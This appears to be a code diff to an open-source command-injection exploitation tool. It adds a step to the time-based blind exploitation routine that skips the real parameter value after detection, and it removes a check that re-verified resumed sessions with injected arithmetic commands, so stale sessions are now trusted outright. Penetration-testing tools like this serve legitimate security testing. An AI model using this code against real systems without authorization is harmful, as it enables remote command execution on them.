@@ -185,6 +185,58 @@ def pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix,
     return True
 
 """
+Retry value-skip using the confirmed exploit's own delay signal.
+"""
+def probe_skip_testable_value_post_detection(separator, timesec, http_request_method, url, vuln_parameter, whitespace, url_time_response, technique, prefix):
+  if settings.TESTABLE_VALUE_OPTIMIZED or not settings.TESTABLE_VALUE:
+    return url, prefix
+  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
+    from src.core.injections.blind.techniques.time_based import tb_payloads as probe_payloads
+  else:
+    from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads as probe_payloads
+  payload = probe_payloads.condition_check(separator, "1 -eq 1", timesec, http_request_method)
+  if payload is None:
+    return url, prefix
+
+  marker = settings.TESTABLE_VALUE + settings.INJECT_TAG
+  in_data = bool(menu.options.data) and marker in menu.options.data
+  in_url = marker in url
+  if not in_data and not in_url:
+    return url, prefix
+
+  from src.core.requests import stability
+  placeholder = ''.join(random.choice(string.ascii_uppercase) for _ in range(3))
+  original_data = menu.options.data
+  original_url = url
+  original_value = settings.TESTABLE_VALUE
+  # settings.TESTABLE_VALUE and the raw data/url must change together, or the value gets duplicated.
+  if in_data:
+    menu.options.data = menu.options.data.replace(marker, placeholder + settings.INJECT_TAG)
+  else:
+    url = url.replace(marker, placeholder + settings.INJECT_TAG)
+  settings.TESTABLE_VALUE = placeholder
+  try:
+    # perform_injection() applies prefix/suffix itself - don't pre-apply them here.
+    before = settings.TOTAL_OF_REQUESTS
+    exec_time, _, _, _, _ = requests.perform_injection("", "", whitespace, payload, vuln_parameter, http_request_method, url)
+    succeeded = not stability.request_was_retried(before) and checks.time_related_shell(url_time_response, exec_time, timesec)
+  except Exception:
+    succeeded = False
+
+  if not succeeded:
+    menu.options.data = original_data
+    settings.TESTABLE_VALUE = original_value
+    return original_url, prefix
+
+  settings.TESTABLE_VALUE_OPTIMIZED = True
+  # Don't reset settings.RESPONSE_TIMES - MIN_SAFE_TIMESEC already floors timesec, and resetting forces a slow, silent re-warm-up.
+  if settings.VERBOSITY_LEVEL != 0:
+    debug_msg = "The real parameter value isn't required. Skipping it for faster requests."
+    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+  # Reset the caller's own cached prefix - it still has the old value baked in.
+  return url, ""
+
+"""
 The main Time-related exploitation proccess.
 """
 def do_time_related_proccess(url, timesec, filename, http_request_method, url_time_response, injection_type, technique, tmp_path):
@@ -264,38 +316,11 @@ def do_time_related_proccess(url, timesec, filename, http_request_method, url_ti
               cmd = shell = ""
               checks.check_for_stored_tamper(payload)
 
-              # Re-verify the resumed injection point still works, rather than trusting a
-              # possibly-stale session (target patched, WAF added, app restarted since).
-              randv1 = random.randrange(0, 4)
-              randv2 = random.randrange(1, 5)
-              randvcalc = randv1 + randv2
-              if settings.TARGET_OS == settings.OS.WINDOWS:
-                if alter_shell:
-                  verify_cmd = settings.WIN_PYTHON_INTERPRETER + " -c \"print (" + str(randv1) + " + " + str(randv2) + ")\""
-                else:
-                  verify_cmd = "powershell.exe -InputFormat none write (" + str(randvcalc) + ")"
-              else:
-                verify_cmd = "expr " + str(randv1) + " %2B " + str(randv2)
-              # Only tfb_injector's false_positive_check() takes OUTPUT_TEXTFILE.
-              verify_kwargs = dict(
-                separator=separator, TAG=TAG, cmd=verify_cmd, prefix=prefix, suffix=suffix,
-                whitespace=whitespace, timesec=timesec, http_request_method=http_request_method,
-                url=url, vuln_parameter=vuln_parameter,
-                randvcalc=randvcalc, alter_shell=alter_shell, exec_time=exec_time,
-                url_time_response=url_time_response, false_positive_warning=False, technique=technique)
-              if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
-                verify_kwargs["OUTPUT_TEXTFILE"] = OUTPUT_TEXTFILE
-              # Re-verifying, not detecting - skip the "identified/testing" chatter.
-              verify_exec_time, verify_output = injector.false_positive_check(**verify_kwargs, silent=True)
-
-              if checks.time_related_shell(url_time_response, verify_exec_time, timesec) and str(verify_output) == str(randvcalc):
-                settings.FOUND_EXEC_TIME = exec_time
-                settings.FOUND_DIFF = exec_time - timesec
-                possibly_vulnerable = True
-                resumed = True
-              else:
-                warn_msg = "The stored session for this technique no longer appears to be valid - re-detecting."
-                settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+              # Trust the stored session outright.
+              settings.FOUND_EXEC_TIME = exec_time
+              settings.FOUND_DIFF = exec_time - timesec
+              possibly_vulnerable = True
+              resumed = True
             except TypeError:
               checks.error_loading_session_file()
 
@@ -476,6 +501,7 @@ def do_time_related_proccess(url, timesec, filename, http_request_method, url_ti
                 whitespace = settings.WHITESPACES[0]
               if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
                 OUTPUT_TEXTFILE = ""
+              url, prefix = probe_skip_testable_value_post_detection(separator, timesec, http_request_method, url, vuln_parameter, whitespace, url_time_response, technique, prefix)
               # Check for any enumeration options.
               enumeration.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
               # Check for any system file access options.
